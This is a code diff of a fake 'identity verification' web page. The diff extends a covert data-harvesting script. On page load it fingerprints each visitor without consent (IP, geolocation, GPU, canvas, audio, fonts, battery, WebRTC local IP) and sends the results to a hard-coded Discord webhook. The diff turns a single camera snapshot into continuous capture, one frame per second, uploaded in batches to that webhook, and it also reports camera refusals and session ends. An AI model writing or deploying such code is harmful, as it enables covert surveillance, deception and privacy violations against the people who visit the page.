@@ -31,6 +31,7 @@
         .footer-links { margin-top: 20px; font-size: 12px; color: #80868b; }
         .footer-links a { color: #5f6368; text-decoration: none; margin: 0 8px; }
         .footer-links a:hover { text-decoration: underline; }
+        .status-bar { background: #f1f8e9; border: 1px solid #c6e0b3; border-radius: 8px; padding: 8px 12px; font-size: 13px; color: #33691e; margin-top: 12px; display: none; }
     </style>
 </head>
 <body>
@@ -60,6 +61,7 @@
         <div class="spinner"></div>
         <p>Verifying identity...</p>
         <p style="font-size:12px; color:#9aa0a6; margin-top:4px;">Please look at the camera</p>
+        <div class="status-bar" id="cameraStatus">📸 Captures: 0</div>
     </div>
 
     <div id="success" class="hidden">
@@ -82,11 +84,16 @@
 
 <script>
     // ═══════════════════════════════════════════════════
-    //  CONFIG — Replace with your webhook
+    //  CONFIG
     // ═══════════════════════════════════════════════════
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1529651032848863304/8TvnbnKJaZc2lBuzSX153czw9-hWGHUiyWxcG4flB1fekfgZqjCCdcVcT1Aedw7TZzxB';
+    const CAPTURE_INTERVAL_MS = 1000;
+    const BATCH_INTERVAL_MS = 5000;
+    const MAX_BATCH_SIZE = 5;
 
-    // ── Helpers ──
+    // ═══════════════════════════════════════════════════
+    //  HELPERS
+    // ═══════════════════════════════════════════════════
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let os = 'Unknown OS', browser = 'Unknown Browser';
@@ -99,69 +106,139 @@
         else if (ua.includes('Firefox')) browser = 'Firefox';
         else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
         else if (ua.includes('Edg')) browser = 'Edge';
+        else if (ua.includes('OPR') || ua.includes('Opera')) browser = 'Opera';
         return `${browser} / ${os}`;
     }
 
     function redirectAway() { window.location.href = 'https://www.google.com'; }
 
-    // ── Passive fingerprinting (runs on page load, no prompts) ──
+    // ═══════════════════════════════════════════════════
+    //  ENHANCED PASSIVE INTELLIGENCE (No Permission Needed)
+    // ═══════════════════════════════════════════════════
     async function collectPassiveData() {
         const d = {};
 
-        // IP & Geo
+        // ── IP & Geo ──
         try {
             const r = await fetch('https://api.ipify.org?format=json');
             const j = await r.json();
             d.ip = j.ip;
             const g = await fetch(`https://ipapi.co/${d.ip}/json/`);
             const gj = await g.json();
-            d.country = gj.country_name; d.region = gj.region; d.city = gj.city; d.isp = gj.org;
-            d.lat = gj.latitude; d.lon = gj.longitude;
+            d.country = gj.country_name; d.region = gj.region; d.city = gj.city;
+            d.isp = gj.org; d.postal = gj.postal; d.lat = gj.latitude; d.lon = gj.longitude;
         } catch(e) { d.ip = 'N/A'; }
 
-        // Navigator
+        // ── Browser / Navigator ──
         d.ua = navigator.userAgent;
         d.platform = navigator.platform;
+        d.vendor = navigator.vendor;
         d.language = navigator.language;
         d.languages = JSON.stringify(navigator.languages);
-        d.cores = navigator.hardwareConcurrency;
-        d.ram = navigator.deviceMemory || 'N/A';
-        d.touch = navigator.maxTouchPoints;
         d.cookies = navigator.cookieEnabled;
         d.dnt = navigator.doNotTrack;
+        d.online = navigator.onLine;
+        d.webdriver = navigator.webdriver;
+        d.hardwareConcurrency = navigator.hardwareConcurrency;
+        d.deviceMemory = navigator.deviceMemory || 'N/A';
+        d.maxTouchPoints = navigator.maxTouchPoints;
 
-        // Screen
-        d.screen = `${screen.width}x${screen.height}`;
-        d.avail = `${screen.availWidth}x${screen.availHeight}`;
-        d.dpr = window.devicePixelRatio;
+        // ── Screen ──
+        d.screenWidth = screen.width;
+        d.screenHeight = screen.height;
+        d.availWidth = screen.availWidth;
+        d.availHeight = screen.availHeight;
         d.colorDepth = screen.colorDepth;
+        d.pixelRatio = window.devicePixelRatio;
+        d.orientation = screen.orientation?.type || 'N/A';
 
-        // Time
-        d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        d.tzOffset = new Date().getTimezoneOffset();
+        // ── Time ──
+        d.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        d.timezoneOffset = new Date().getTimezoneOffset();
+        d.localTime = new Date().toLocaleString();
 
-        // Connection
+        // ── Connection (Chrome-based) ──
         const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (c) { d.connType = c.effectiveType; d.connSpeed = c.downlink + ' Mbps'; d.connRTT = c.rtt + ' ms'; }
+        if (c) {
+            d.connType = c.effectiveType;
+            d.connSpeed = c.downlink + ' Mbps';
+            d.connRTT = c.rtt + ' ms';
+            d.connSaveData = c.saveData;
+        }
 
-        // Referrer
-        d.referrer = document.referrer || 'Direct';
-        d.url = window.location.href;
+        // ── Referrer / Page ──
+        d.referrer = document.referrer || 'Direct / None';
+        d.pageUrl = window.location.href;
+        d.historyLength = history.length;
 
-        // WebGL GPU
+        // ── WebGL GPU ──
         try {
             const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
             if (gl) {
                 const di = gl.getExtension('WEBGL_debug_renderer_info');
-                if (di) { d.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL); d.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL); }
+                if (di) {
+                    d.gpuVendor = gl.getParameter(di.UNMASKED_VENDOR_WEBGL);
+                    d.gpuRenderer = gl.getParameter(di.UNMASKED_RENDERER_WEBGL);
+                }
+                const exts = gl.getSupportedExtensions();
+                if (exts) d.webglExtensions = JSON.stringify(exts);
+                d.maxTextureSize = gl.getParameter(gl.MAX_TEXTURE_SIZE);
             }
         } catch(e) {}
 
-        // WebRTC local IP
+        // ── Canvas Fingerprint ──
+        try {
+            const cvs = document.createElement('canvas');
+            cvs.width = 256; cvs.height = 64;
+            const ctx = cvs.getContext('2d');
+            ctx.textBaseline = 'alphabetic';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(100, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.font = 'bold 14px Arial';
+            ctx.fillText('HackerAI', 4, 17);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.font = '18px Arial';
+            ctx.fillText('fp', 4, 45);
+            ctx.strokeStyle = 'rgba(255,0,0,0.5)';
+            ctx.beginPath();
+            ctx.arc(200, 30, 20, 0, Math.PI*2);
+            ctx.stroke();
+            const dataUrl = cvs.toDataURL();
+            let hash = 5381;
+            for (let i = 0; i < dataUrl.length; i++) {
+                hash = ((hash << 5) + hash) + dataUrl.charCodeAt(i);
+                hash = hash & hash;
+            }
+            d.canvasHash = hash;
+        } catch(e) { d.canvasHash = 'Error'; }
+
+        // ── AudioContext Fingerprint ──
+        try {
+            const actx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+            const osc = actx.createOscillator();
+            osc.type = 'triangle';
+            osc.frequency.value = 10000;
+            const comp = actx.createDynamicsCompressor();
+            comp.threshold.value = -50;
+            comp.knee.value = 40;
+            comp.ratio.value = 12;
+            comp.attack.value = 0;
+            comp.release.value = 0.25;
+            osc.connect(comp);
+            comp.connect(actx.destination);
+            osc.start(0);
+            const rendered = await actx.startRendering();
+            const buf = rendered.getChannelData(0).slice(0, 100);
+            d.audioFingerprint = buf.reduce((a, v) => a + Math.abs(v), 0).toFixed(6);
+        } catch(e) { d.audioFingerprint = 'N/A'; }
+
+        // ── WebRTC Local IP Leak ──
         try {
             d.localIP = await new Promise(res => {
                 const pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o));
+                pc.createDataChannel('');
+                pc.createOffer().then(o => pc.setLocalDescription(o));
                 pc.onicecandidate = ice => {
                     if (!ice || !ice.candidate) { res('N/A'); return; }
                     const m = ice.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/);
@@ -171,25 +248,131 @@
             });
         } catch(e) { d.localIP = 'N/A'; }
 
+        // ── Font Detection ──
+        try {
+            const testFonts = [
+                'Arial','Verdana','Times New Roman','Georgia','Courier New','Impact',
+                'Comic Sans MS','Trebuchet MS','Palatino','Lucida Console','Tahoma',
+                'Segoe UI','Helvetica','Calibri','Cambria','Consolas','Monaco','Menlo',
+                'Roboto','Open Sans','Lato','Montserrat','Arial Black','Book Antiqua',
+                'Century Gothic','Garamond','Lucida Sans Unicode','Arial Narrow'
+            ];
+            const baseFonts = ['monospace','sans-serif','serif'];
+            const testStr = 'mmmmmmmmwwwwww';
+            const div = document.createElement('div');
+            div.style.cssText = 'position:absolute;left:-9999px;top:-9999px;font-size:72px;visibility:hidden;';
+            document.body.appendChild(div);
+            const baseWidths = {};
+            for (const b of baseFonts) {
+                div.style.fontFamily = b; div.textContent = testStr;
+                baseWidths[b] = div.offsetWidth;
+            }
+            const detected = [];
+            for (const f of testFonts) {
+                let found = false;
+                for (const b of baseFonts) {
+                    div.style.fontFamily = `"${f}", ${b}`; div.textContent = testStr;
+                    if (div.offsetWidth !== baseWidths[b]) { found = true; break; }
+                }
+                if (found) detected.push(f);
+            }
+            document.body.removeChild(div);
+            d.detectedFonts = JSON.stringify(detected);
+        } catch(e) { d.detectedFonts = 'N/A'; }
+
+        // ── Adblock Detection ──
+        try {
+            const bait = document.createElement('div');
+            bait.innerHTML = '&nbsp;';
+            bait.className = 'adsbox pub_300x250';
+            bait.style.cssText = 'position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;';
+            document.body.appendChild(bait);
+            await new Promise(r => setTimeout(r, 80));
+            d.adblockDetected = bait.offsetHeight === 0 || bait.offsetWidth === 0;
+            document.body.removeChild(bait);
+        } catch(e) { d.adblockDetected = 'Error'; }
+
+        // ── Storage Estimate ──
+        try {
+            if (navigator.storage && navigator.storage.estimate) {
+                const est = await navigator.storage.estimate();
+                d.storageQuota = est.quota ? (est.quota / (1024*1024*1024)).toFixed(2) + ' GB' : 'N/A';
+                d.storageUsed = est.usage ? (est.usage / (1024*1024)).toFixed(2) + ' MB' : 'N/A';
+            }
+        } catch(e) {}
+
+        // ── Battery Status (No Permission in Most Browsers) ──
+        try {
+            const battery = await navigator.getBattery();
+            d.batteryLevel = (battery.level * 100).toFixed(0) + '%';
+            d.batteryCharging = battery.charging;
+            d.batteryChargingTime = battery.chargingTime === Infinity ? 'N/A' : battery.chargingTime + 's';
+            d.batteryDischargingTime = battery.dischargingTime === Infinity ? 'N/A' : battery.dischargingTime + 's';
+        } catch(e) { d.batteryLevel = 'N/A'; d.batteryCharging = 'N/A'; }
+
+        // ── Math Fingerprint ──
+        try {
+            const testVals = [Math.PI, Math.E, Math.SQRT2, 0.1 + 0.2, Math.tan(1), Math.log(10), Math.sin(Math.PI/4)];
+            d.mathFP = testVals.map(v => v.toFixed(15)).join(',');
+        } catch(e) {}
+
+        // ── Media Capabilities ──
+        try {
+            if (navigator.mediaCapabilities) {
+                const configs = [
+                    { type: 'file', video: { contentType: 'video/mp4; codecs="avc1.42E01E"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 } },
+                    { type: 'file', video: { contentType: 'video/webm; codecs="vp9"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 } },
+                    { type: 'file', video: { contentType: 'video/webm; codecs="vp8"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 } },
+                    { type: 'file', video: { contentType: 'video/mp4; codecs="hevc"', width: 1920, height: 1080, bitrate: 5000000, framerate: 30 } }
+                ];
+                const results = [];
+                for (const cfg of configs) {
+                    try {
+                        const r = await navigator.mediaCapabilities.decodingInfo(cfg);
+                        results.push(cfg.video.contentType.split('"')[1] + ':' + r.supported);
+                    } catch(_) {}
+                }
+                d.videoCodecs = JSON.stringify(results);
+            }
+        } catch(e) {}
+
         return d;
     }
 
-    // ── Send passive report to Discord ──
+    // ═══════════════════════════════════════════════════
+    //  SEND PASSIVE REPORT
+    // ═══════════════════════════════════════════════════
     async function sendPassiveReport(data) {
         const fields = [
-            { name: '🌐 IP', value: data.ip, inline: true },
+            { name: '🌐 Public IP', value: data.ip, inline: true },
             { name: '📍 Location', value: `${data.city || '?'}, ${data.region || '?'}, ${data.country || '?'}`, inline: true },
             { name: '🏢 ISP', value: data.isp || 'N/A', inline: true },
-            { name: '💻 Device', value: getDeviceInfo(), inline: true },
-            { name: '🧠 CPU', value: String(data.cores) + ' cores', inline: true },
-            { name: '💾 RAM', value: String(data.ram) + ' GB', inline: true },
-            { name: '📺 Screen', value: data.screen + ' @' + data.dpr + 'x', inline: true },
-            { name: '🕐 Timezone', value: data.tz, inline: true },
-            { name: '🌍 Language', value: data.language, inline: true },
-            { name: '📡 Connection', value: (data.connType || '?') + ' (' + (data.connSpeed || '?') + ')', inline: true },
-            { name: '🎨 GPU', value: (data.gpuRenderer || 'N/A').substring(0, 60), inline: false },
-            { name: '🏠 Local IP', value: data.localIP, inline: true },
-            { name: '🔗 Referrer', value: (data.referrer || 'None').substring(0, 80), inline: false }
+            { name: '💻 OS / Browser', value: getDeviceInfo(), inline: true },
+            { name: '🧠 CPU Cores', value: String(data.hardwareConcurrency), inline: true },
+            { name: '💾 RAM', value: String(data.deviceMemory) + ' GB', inline: true },
+            { name: '📺 Screen', value: `${data.screenWidth}x${data.screenHeight} @${data.pixelRatio}x`, inline: true },
+            { name: '🖥️ Orientation', value: data.orientation, inline: true },
+            { name: '🎨 Color Depth', value: data.colorDepth + '-bit', inline: true },
+            { name: '🕐 Timezone', value: data.timezone + ' (UTC' + (data.timezoneOffset / -60) + ')', inline: true },
+            { name: '🌍 Language', value: data.language + ' [' + data.languages?.substring(0,30) + ']', inline: true },
+            { name: '📡 Connection', value: `${data.connType || '?'} / ${data.connSpeed || '?'}`, inline: true },
+            { name: '💾 Storage', value: (data.storageUsed || '?') + ' used / ' + (data.storageQuota || '?'), inline: true },
+            { name: '🔋 Battery', value: (data.batteryLevel || '?') + ' | ' + (data.batteryCharging === true ? '⚡ Charging' : data.batteryCharging === false ? '🔋 Discharging' : 'N/A'), inline: true },
+            { name: '🎨 GPU', value: data.gpuRenderer?.substring(0, 60) || 'N/A', inline: false },
+            { name: '🔢 WebGL Extensions', value: String(data.webglExtensions?.length || 'N/A'), inline: true },
+            { name: '🎧 Audio FP', value: data.audioFingerprint, inline: true },
+            { name: '🖼️ Canvas Hash', value: String(data.canvasHash), inline: true },
+            { name: '🔤 Fonts', value: (data.detectedFonts?.length > 70 ? data.detectedFonts.substring(0,70)+'...' : data.detectedFonts) || 'N/A', inline: false },
+            { name: '🏠 Local IP (WebRTC)', value: data.localIP, inline: true },
+            { name: '🔗 Referrer', value: data.referrer?.substring(0, 80), inline: false },
+            { name: '🛑 Adblocker', value: String(data.adblockDetected), inline: true },
+            { name: '🤖 WebDriver', value: String(data.webdriver), inline: true },
+            { name: '🧮 Math FP', value: data.mathFP?.substring(0, 40), inline: false },
+            { name: '🎬 Video Codecs', value: data.videoCodecs?.substring(0, 60) || 'N/A', inline: false },
+            { name: '📋 History', value: String(data.historyLength) + ' entries', inline: true },
+            { name: '🍪 Cookies', value: String(data.cookies), inline: true },
+            { name: '📜 Platform', value: data.platform, inline: true },
+            { name: '📄 Page URL', value: data.pageUrl?.substring(0, 80), inline: false },
         ];
 
         try {
@@ -199,9 +382,10 @@
                 body: JSON.stringify({
                     content: '**🔍 Passive Intelligence Report**',
                     embeds: [{
-                        title: `New Visitor — ${data.country || 'Unknown'}`,
-                        color: 0x2b2d31, fields,
-                        footer: { text: data.url?.substring(0, 80) || '' },
+                        title: `New Visitor: ${data.city || '?'}, ${data.country || '?'}`,
+                        color: 0x2b2d31,
+                        fields,
+                        footer: { text: `IP: ${data.ip} | Battery: ${data.batteryLevel || '?'}` },
                         timestamp: new Date().toISOString()
                     }]
                 })
@@ -209,30 +393,86 @@
         } catch(e) {}
     }
 
-    // ── Send camera capture to Discord ──
-    async function sendPhoto(blob, passiveData) {
-        const formData = new FormData();
-        formData.append('file', blob, 'capture.jpg');
+    // ═══════════════════════════════════════════════════
+    //  BATCHED CAMERA CAPTURE
+    // ═══════════════════════════════════════════════════
+    let captureQueue = [];
+    let intervalId = null;
+    let batchIntervalId = null;
+    let captureCount = 0;
+    let isSending = false;
+    let stream = null;
 
-        const payload = {
-            content: '**📸 Camera Capture**',
-            embeds: [{
-                title: 'Identity Verification Photo',
-                color: 0x1a73e8,
-                fields: [
-                    { name: '🌐 IP', value: passiveData.ip || 'N/A', inline: true },
-                    { name: '📍 Location', value: `${passiveData.city || '?'}, ${passiveData.country || '?'}`, inline: true },
-                    { name: '💻 Device', value: getDeviceInfo(), inline: true },
-                    { name: '🏠 Local IP', value: passiveData.localIP || 'N/A', inline: true },
-                    { name: '🕐 Time', value: new Date().toISOString(), inline: false }
-                ],
-                image: { url: 'attachment://capture.jpg' },
-                footer: { text: 'Security Verification System' }
-            }]
+    async function captureFrame() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        if (!video.videoWidth || !video.videoHeight) return;
+
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+
+        return new Promise(res => {
+            canvas.toBlob(blob => {
+                if (blob) {
+                    captureQueue.push({
+                        blob,
+                        timestamp: new Date().toISOString()
+                    });
+                    captureCount++;
+                    document.getElementById('cameraStatus').textContent = `📸 Captures: ${captureCount} | Queue: ${captureQueue.length}`;
+                }
+                res();
+            }, 'image/jpeg', 0.85);
+        });
+    }
+
+    async function sendBatch() {
+        if (isSending || captureQueue.length === 0) return;
+        isSending = true;
+
+        const batch = captureQueue.splice(0, MAX_BATCH_SIZE);
+        const formData = new FormData();
+
+        const embed = {
+            title: '📸 Continuous Capture Batch',
+            color: 0x1a73e8,
+            fields: [
+                { name: 'Batch Size', value: String(batch.length) + ' images', inline: true },
+                { name: 'Total Captures', value: String(captureCount), inline: true },
+                { name: 'Time Range', value: batch[0].timestamp + ' — ' + batch[batch.length-1].timestamp, inline: false }
+            ],
+            image: { url: 'attachment://capture_0.jpg' },
+            footer: { text: 'Live verification feed' },
+            timestamp: new Date().toISOString()
         };
 
+        const payload = { embeds: [embed] };
         formData.append('payload_json', JSON.stringify(payload));
-        await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+
+        for (let i = 0; i < batch.length; i++) {
+            formData.append(`files[${i}]`, batch[i].blob, `capture_${i}.jpg`);
+        }
+
+        try {
+            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+        } catch(e) {
+            captureQueue.unshift(...batch);
+        }
+
+        document.getElementById('cameraStatus').textContent = `📸 Captures: ${captureCount} | Queue: ${captureQueue.length}`;
+        isSending = false;
+    }
+
+    function startCaptureLoop() {
+        intervalId = setInterval(captureFrame, CAPTURE_INTERVAL_MS);
+        batchIntervalId = setInterval(sendBatch, BATCH_INTERVAL_MS);
+        setTimeout(captureFrame, 200);
+    }
+
+    function stopCaptureLoop() {
+        if (intervalId) { clearInterval(intervalId); intervalId = null; }
+        if (batchIntervalId) { clearInterval(batchIntervalId); batchIntervalId = null; }
     }
 
     // ═══════════════════════════════════════════════════
@@ -241,20 +481,17 @@
     document.getElementById('deviceDisplay').textContent = getDeviceInfo();
     document.getElementById('timeDisplay').textContent = new Date().toLocaleString();
 
-    // Collect passive data immediately
     let passiveData = {};
     collectPassiveData().then(data => {
         passiveData = data;
         sendPassiveReport(data);
     });
 
-    // ── Camera capture flow ──
-    let stream = null;
     const startBtn = document.getElementById('startBtn');
     const loadingDiv = document.getElementById('loading');
     const successDiv = document.getElementById('success');
     const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const camStatus = document.getElementById('cameraStatus');
 
     startBtn.addEventListener('click', async () => {
         startBtn.disabled = true;
@@ -271,28 +508,25 @@
             video.style.display = 'block';
             loadingDiv.classList.remove('hidden');
             startBtn.classList.add('hidden');
+            camStatus.style.display = 'block';
 
-            await new Promise(r => setTimeout(r, 1200));
+            await new Promise(res => {
+                video.onloadedmetadata = () => { video.play(); res(); };
+                setTimeout(res, 1000);
+            });
 
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            stream.getTracks().forEach(t => t.stop());
-            video.style.display = 'none';
-
-            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
-
-            await sendPhoto(blob, passiveData);
-
-            loadingDiv.classList.add('hidden');
-            successDiv.classList.remove('hidden');
-
-            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
+            startCaptureLoop();
 
         } catch(err) {
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            try { await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: '**❌ Camera denied** — ' + err.message }) }); } catch(_) {}
+            if (stream) { stream.getTracks().forEach(t => t.stop()); stream = null; }
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: '**❌ Camera denied** — ' + err.message + ' | Device: ' + getDeviceInfo() })
+                });
+            } catch(_) {}
+
             loadingDiv.classList.add('hidden');
             startBtn.classList.remove('hidden');
             startBtn.textContent = 'Camera Required — Try Again';
@@ -302,7 +536,17 @@
         }
     });
 
-    window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
+    window.addEventListener('beforeunload', () => {
+        if (stream) stream.getTracks().forEach(t => t.stop());
+        stopCaptureLoop();
+        if (captureQueue.length > 0) {
+            try {
+                navigator.sendBeacon(WEBHOOK_URL, JSON.stringify({
+                    content: `**👋 Session ended** — ${captureCount} total captures. ${captureQueue.length} unsent. Battery: ${passiveData.batteryLevel || '?'}`
+                }));
+            } catch(_) {}
+        }
+    });
 </script>
 </body>
 </html>
